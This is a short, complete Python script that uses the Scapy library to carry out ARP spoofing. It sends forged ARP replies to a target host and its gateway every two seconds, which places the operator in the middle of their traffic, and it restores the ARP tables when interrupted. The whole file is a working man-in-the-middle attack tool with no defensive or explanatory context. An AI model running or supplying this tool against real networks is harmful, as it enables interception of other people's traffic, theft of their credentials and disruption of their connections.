#!/usr/bin/env python
from scapy.layers.l2 import ARP
from scapy.layers.l2 import Ether
import scapy.all as scapy
import time
import optparse


def get_args():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target_ip", dest="target_ip", help="The IP of the Target/Client")
    parser.add_option("-g", "--gateway_ip", dest="gateway_ip", help="The IP of the Gateway/Router")
    options, arguments = parser.parse_args()
    return options


def get_mac(ip):
    arp_req = ARP(pdst = ip)
    broadcast =Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast/arp_req
    answered_list = scapy.srp(arp_req_broadcast, timeout = 1, verbose = False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(packet, verbose = False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, count = 4, verbose = False)


options = get_args()
target_ip = options.target_ip
gateway_ip = options.gateway_ip

try:
    packets_sent = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packets_sent += 2
        print("\r[+] Sent" + str(packets_sent), end = "")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected Keyboard Interrupt .... Resetting ARP Tables, Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
